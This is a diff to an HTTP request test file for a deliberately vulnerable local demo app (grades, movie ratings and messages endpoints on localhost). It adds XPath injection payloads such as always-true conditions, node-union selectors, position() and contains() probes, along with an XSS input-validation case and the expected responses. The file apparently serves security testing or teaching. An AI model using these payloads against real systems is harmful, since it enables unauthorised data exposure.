@@ -61,34 +61,151 @@ Accept: application/json
 # @expect: 200 OK with potentially sensitive data
 
 ###vul8
-### 1. Normal Request
+### 1. Normal request - should return 200 OK
 GET http://localhost:3000/grades?studentId=s1001
 Accept: application/json
 
-### 2. Basic XPath Injection - Always True
+### 2. Request with spaces - should return 200 OK (spaces are trimmed)
+GET http://localhost:3000/grades?studentId=  s1002  
+Accept: application/json
+
+### 3. Invalid ID format - should return 400 Bad Request
+GET http://localhost:3000/grades?studentId=abc123
+Accept: application/json
+
+### 4. Missing parameter - should return 400 Bad Request
+GET http://localhost:3000/grades
+Accept: application/json
+
+### 5. Basic XPath Injection - should return 200 OK and reveal all records
+# This bypasses authentication by making the condition always true
 GET http://localhost:3000/grades?studentId=s1001' or '1'='1
 Accept: application/json
 
-### 3. Get All Students
-GET http://localhost:3000/grades?studentId=' or 1=1 or '
+### 6. XPath Injection with comment - should return 200 OK and reveal all records
+# This comments out the rest of the expression
+GET http://localhost:3000/grades?studentId=s1001']|//*|//*['
 Accept: application/json
 
-### 4. Union Attack
-GET http://localhost:3000/grades?studentId=x']|//*|//*['
+### 7. XPath Injection to get first record - should return 200 OK
+# This uses XPath position() function
+GET http://localhost:3000/grades?studentId=' or position()=1 or '
 Accept: application/json
 
-### 5. Comment Attack
-GET http://localhost:3000/grades?studentId=s1001']|//student[1]|//*['
+### 8. XPath Injection with string concatenation - should return 200 OK
+# This demonstrates string manipulation in XPath
+GET http://localhost:3000/grades?studentId=' or contains(name,'a') or '
 Accept: application/json
 
-### 6. Boolean Blind
-GET http://localhost:3000/grades?studentId=s1001' and substring(name,1,1)='A' or '
+### 9. XPath Injection with boolean expression - should return 200 OK
+# This uses boolean logic to bypass authentication
+GET http://localhost:3000/grades?studentId=' or true() or '
 Accept: application/json
 
-### 7. Error Based
-GET http://localhost:3000/grades?studentId=s1001' and 1=count(//*) or '
+### 10. XPath Injection with node selection - should return 200 OK
+# This selects all student nodes regardless of ID
+GET http://localhost:3000/grades?studentId=']|//student|//student['
 Accept: application/json
 
-### 8. String Extraction
-GET http://localhost:3000/grades?studentId=s1001' and starts-with(name,'A') or '
+### vul9
+### 1. Normal Request - Valid Movie (Should return 200 OK)
+GET http://localhost:3000/movies/rating?movieTitle=The%20Shawshank%20Redemption
+Accept: application/json
+
+### Expected: 200 OK with rating data
+### Example response:
+### {
+###   "movieTitle": "The Shawshank Redemption",
+###   "rating": 9.3
+### }
+
+
+### 2. Normal Request - Movie Not Found (Should return 404)
+GET http://localhost:3000/movies/rating?movieTitle=Non%20Existent%20Movie
+Accept: application/json
+
+### Expected: 404 Not Found
+### Example response:
+### {
+###   "error": "Movie not found",
+###   "movieTitle": "Non Existent Movie"
+### }
+
+
+### 3. XPath Injection - Always True Condition (Should return 200 OK)
+GET http://localhost:3000/movies/rating?movieTitle='%20or%20'1'='1
+Accept: application/json
+
+### Expected: 200 OK with first movie's rating
+### This bypasses the title check by making the condition always true
+### Example response:
+### {
+###   "movieTitle": "' or '1'='1",
+###   "rating": 9.3
+### }
+
+
+### 4. XPath Injection - Specific Movie (Should return 200 OK)
+GET http://localhost:3000/movies/rating?movieTitle='%20or%20title='The%20Dark%20Knight'%20or%20''='
+Accept: application/json
+
+### Expected: 200 OK with The Dark Knight's rating
+### Directly targets specific movie regardless of input
+### Example response:
+### {
+###   "movieTitle": "' or title='The Dark Knight' or ''='",
+###   "rating": 9.0
+### }
+
+
+### 5. XPath Injection - Extract All Data (Should return 500 or unexpected data)
+GET http://localhost:3000/movies/rating?movieTitle=']|//rating|//*['
+Accept: application/json
+
+### Expected: 500 Internal Server Error
+### Attempts to extract all rating nodes from XML
+
+
+### 6. Input Validation Test - Malicious Characters (Should return 400 Bad Request)
+GET http://localhost:3000/movies/rating?movieTitle=<script>alert(1)</script>
+Accept: application/json
+
+### Expected: 400 Bad Request
+### Caught by input validation middleware
+### Example response:
+### {
+###   "error": "Invalid characters in movieTitle"
+### }
+
+
+### 7. Missing Parameter Test (Should return 400 Bad Request)
+GET http://localhost:3000/movies/rating
+Accept: application/json
+
+### Expected: 400 Bad Request
+### Caught by parameter validation
+### Example response:
+### {
+###   "error": "movieTitle query parameter is required and must be a string"
+### }
+
+###vul6
+### 1. 정상 요청 (기본 확인) - 200 OK
+GET http://localhost:3000/messages/from?sender=alice@example.com
+Accept: application/json
+
+### 2. XPath 인젝션 (모든 메시지 반환) - 200 OK
+GET http://localhost:3000/messages/from?sender=alice@example.com'%20or%20''='
+Accept: application/json
+
+### 3. XPath 인젝션 (첫 번째 메시지 반환) - 200 OK
+GET http://localhost:3000/messages/from?sender=alice@example.com'%20or%20position()=1%20or%20''='
+Accept: application/json
+
+### 4. XPath 인젝션 (특정 문자열 포함 메시지 반환) - 200 OK
+GET http://localhost:3000/messages/from?sender=alice@example.com'%20or%20contains(sender,'example')%20or%20''='
+Accept: application/json
+
+### 5. XPath 인젝션 (모든 노드 반환) - 200 OK
+GET http://localhost:3000/messages/from?sender=alice@example.com']|//*|//*['
 Accept: application/json
